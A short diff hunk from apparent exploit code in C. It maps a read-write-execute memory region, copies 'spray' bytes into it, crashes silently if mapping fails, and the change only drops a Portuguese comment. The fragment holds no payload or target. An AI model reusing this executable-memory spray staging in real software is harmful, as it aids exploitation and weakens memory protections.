@@ -318,7 +318,7 @@ int main() {
     char* spray_stop = spray_end;
     char* spray_map = mmap(0, spray_stop - spray_start, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0);
     if (spray_map == MAP_FAILED)
-        *(volatile int*)0; // Crash silencioso se mmap falhar
+        *(volatile int*)0; 
 
     for (size_t i = 0; i < spray_stop - spray_start; i++)
         spray_map[i] = spray_start[i];
